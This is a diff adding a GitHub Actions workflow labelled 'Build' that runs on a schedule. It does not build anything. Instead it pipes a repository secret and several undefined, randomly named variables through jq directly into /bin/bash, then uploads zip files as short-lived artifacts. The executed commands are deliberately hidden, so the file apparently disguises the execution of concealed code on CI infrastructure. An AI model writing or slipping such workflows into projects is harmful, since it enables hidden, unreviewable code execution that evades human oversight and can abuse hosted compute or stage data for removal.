@@ -1,0 +1,30 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '9 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          f21: ${{ secrets.f21 }}
+        run: |
+          printf '%s' "$f21" | jq -r .qjl703 | /bin/bash
+          printf '%s' "$zzq507" | jq -r .zue0929 | /bin/bash
+          echo $frk59 | jq -r .np64 | /bin/bash
+          echo $xp9903 | jq -r .k33794 | /bin/bash
+          echo $c6761 | jq -r .zea95 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Ptj4NPjJ
+          path: "*.zip"
+          retention-days: 1
